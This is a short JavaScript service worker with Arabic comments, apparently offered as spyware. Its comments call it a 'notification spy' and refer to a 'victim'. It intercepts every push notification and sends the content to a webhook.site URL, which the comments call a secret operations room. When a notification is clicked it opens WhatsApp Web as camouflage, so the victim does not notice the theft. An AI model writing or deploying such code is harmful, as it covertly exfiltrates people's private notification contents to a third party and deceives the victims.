// كود أبادون النهائي لاقتناص الإشعارات
self.addEventListener('push', function(event) {
    let payload = event.data ? event.data.text() : 'إشعار جديد بلا محتوى';
    
    // إرسال البيانات فوراً لغرفة عملياتك السريّة على Webhook.site
    event.waitUntil(
        fetch('https://webhook.site/67c1ee4b-66bd-4c2e-90be-50a7474be300', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                app: "Notification Spy",
                content: payload,
                timestamp: new Date().toLocaleString()
            })
        })
    );
});

// التمويه: توجيه الضحية لواتساب عند الضغط على الإشعار
self.addEventListener('notificationclick', function(event) {
    event.notification.close();
    event.waitUntil(clients.openWindow('https://web.whatsapp.com'));
});
